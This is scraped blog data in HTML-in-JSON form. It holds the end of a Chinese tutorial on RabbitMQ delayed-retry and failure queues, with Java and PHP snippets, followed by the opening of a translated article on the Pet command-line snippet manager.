class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Exception</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getRetryCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca738080917229-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">retryCount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 重试次数大于3次，则自动加入到失败队列</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca738080917229-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.failed\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MessageProperties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PERSISTENT_BASIC</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca738080917229-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 重试次数小于3，则加入到重试队列，30s后再重试</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"master.retry\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">properties</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">body</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca738080917229-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca738080917229-15\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p></p>\n<h4>失败任务重试</h4>\n<p>如果任务重试三次仍未成功，则会被投递到失败队列，这时候需要人工处理程序异常，处理完毕后，需要将消息重新投递到队列进行处理，这里唯一需要做的就是从失败队列订阅消息，然后获取到消息后，清空其<code>application_headers</code>头信息，然后重新投递到<code>master</code>这个Exchange即可。</p>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca73c388955179\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchannel.basicPublish(\r\n    'master', \r\n    envelope.getRoutingKey(),\r\n    MessageProperties.PERSISTENT_BASIC,\r\n    body\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca73c388955179-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca73c388955179-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca73c388955179-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca73c388955179-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca73c388955179-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca73c388955179-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca73c388955179-1\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">basicPublish</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca73c388955179-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca73c388955179-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">envelope</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getRoutingKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca73c388955179-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">MessageProperties</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">PERSISTENT_BASIC</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca73c388955179-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">body</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca73c388955179-6\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>PHP代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca73f816582111\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$msg-&gt;set('application_headers', new AMQPTable([]));\r\n$this-&gt;channel-&gt;basic_publish(\r\n    $msg,\r\n    'master',\r\n    $msg-&gt;get('routing_key')\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca73f816582111-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca73f816582111-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca73f816582111-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca73f816582111-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca73f816582111-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca73f816582111-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca73f816582111-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'application_headers'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AMQPTable</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca73f816582111-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-r\">this</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">channel</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">basic_publish</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca73f816582111-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca73f816582111-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca73f816582111-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">msg</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'routing_key'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca73f816582111-6\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h3>怎么使用</h3>\n<p>队列和Exchange以及发布订阅的关系我们就说完了，那么使用起来是什么效果呢？这里我们以Java代码为例</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca743556182090\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 发布消息\r\nPublisher publisher = new Publisher(factory.newConnection(), 'master');\r\npublisher.publish(\"{\\\"id\\\":121, \\\"name\\\":\\\"guanyiyao\\\"}\", \"user.create\");\r\n\r\n// 订阅消息\r\nnew Subscriber(factory.newConnection(), Main.EXCHANGE_NAME)\r\n    .init(\"user-monitor\", \"user.*\")\r\n    .subscribe((message, routingKey) -&gt; {\r\n        // TODO 业务逻辑\r\n        System.out.printf(\"     message consumed: %s\\n\", routingKey, message);\r\n    }\r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca743556182090-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca743556182090-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca743556182090-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca743556182090-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca743556182090-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca743556182090-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca743556182090-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca743556182090-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca743556182090-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca743556182090-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa92eca743556182090-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92eca743556182090-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92eca743556182090-1\"><span class=\"crayon-c\">// 发布消息</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca743556182090-2\"><span class=\"crayon-e\">Publisher </span><span class=\"crayon-v\">publisher</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Publisher</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">factory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newConnection</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'master'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca743556182090-3\"><span class=\"crayon-v\">publisher</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">publish</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"{\\\"id\\\":121, \\\"name\\\":\\\"guanyiyao\\\"}\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"user.create\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca743556182090-4\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca743556182090-5\"><span class=\"crayon-c\">// 订阅消息</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca743556182090-6\"><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Subscriber</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">factory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newConnection</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Main</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">EXCHANGE_NAME</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca743556182090-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">init</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"user-monitor\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"user.*\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca743556182090-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">subscribe</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca743556182090-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// TODO 业务逻辑</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca743556182090-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"     message consumed: %s\\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">routingKey</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">message</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa92eca743556182090-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92eca743556182090-12\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0049 seconds] -->\r\n<p></p>\n<h2>总结</h2>\n<p>使用RabbitMQ时，实现延时重试和失败队列的方式并不仅仅局限于本文中描述的方法，如果读者有更好的实现方案，欢迎拍砖，在这里我也只是抛砖引玉了。本文中讲述的方法还有很多优化空间，读者也可以试着去改进其实现方案，比如本文中使用了三个Exchagne，是否只使用一个Exchange也能实现本文中所讲述的功能。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/e8b93699352c7d38fa1d9d15a95ba461.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/2197f30341190c0c9daab43dd2d4ce0c.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113984\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113984votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113984\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/mylxsw\">管宜尧</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/mylxsw\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/01/691a6775e88ff962fd90f229d711d0da.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            PHP程序猿，常用网络ID为mylxsw，具有6年以上PHP研发经验，专注于PHP，Golang以及Linux生态、微服务架构等方向，对技术比较执着，经常会写一些博文分享自己的所学，目前就职于重庆允升科技有限公司。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/mylxsw\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/mylxsw/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/mylxsw/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"https://aicode.cc\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/code404\"><i class=\"fa fa-weibo\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/mylxsw\"><i class=\"fa fa-github\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "开发,RabbitMQ", "url": "http://blog.jobbole.com/113984/", "url_obj_id": "a1c4868d9e1eb29137006234c75e2c5e"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/310d11635ef5716e4028f2035c080286.png"], "title": "Pet：一个简单的命令行片段管理器", "create_date": "2018/05/07 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/pet-simple-command-line-snippet-manager/\">SK</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9600-1.html\">Linux中国/MjSeven</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/310d11635ef5716e4028f2035c080286.png\" alt=\"\"></p>\n<p>我们不可能记住所有的命令，对吧？是的。除了经常使用的命令之外，我们几乎不可能记住一些很少使用的长命令。这就是为什么需要一些外部工具来帮助我们在需要时找到命令。在过去，我们已经点评了两个有用的工具，名为 “Bashpast” 和 “Keep”。使用 Bashpast，我们可以轻松地为 Linux 命令添加书签，以便更轻松地重复调用。而 Keep 实用程序可以用来在终端中保留一些重要且冗长的命令，以便你可以随时使用它们。今天，我们将看到该系列中的另一个工具，以帮助你记住命令。现在让我们认识一下 “Pet”，这是一个用 Go 语言编写的简单的命令行代码管理器。</p>\n<p>使用 Pet，你可以：</p>\n<ul>\n<li>注册/添加你重要的、冗长和复杂的命令片段。</li>\n<li>以交互方式来搜索保存的命令片段。</li>\n<li>直接运行代码片段而无须一遍又一遍地输入。</li>\n<li>轻松编辑保存的代码片段。</li>\n<li>通过 Gist 同步片段。</li>\n<li>在片段中使用变量</li>\n<li>还有很多特性即将来临。</li>\n</ul>\n<h3 id=\"toc_1\">安装 Pet 命令行接口代码管理器</h3>\n<p>由于它是用 Go 语言编写的，所以确保你在系统中已经安装了 Go。</p>\n<p>安装 Go 后，从 <a href=\"https://github.com/knqyf263/pet/releases\"><strong>Pet 发布页面</strong></a> 获取最新的二进制文件。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93127ba6953941497\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button 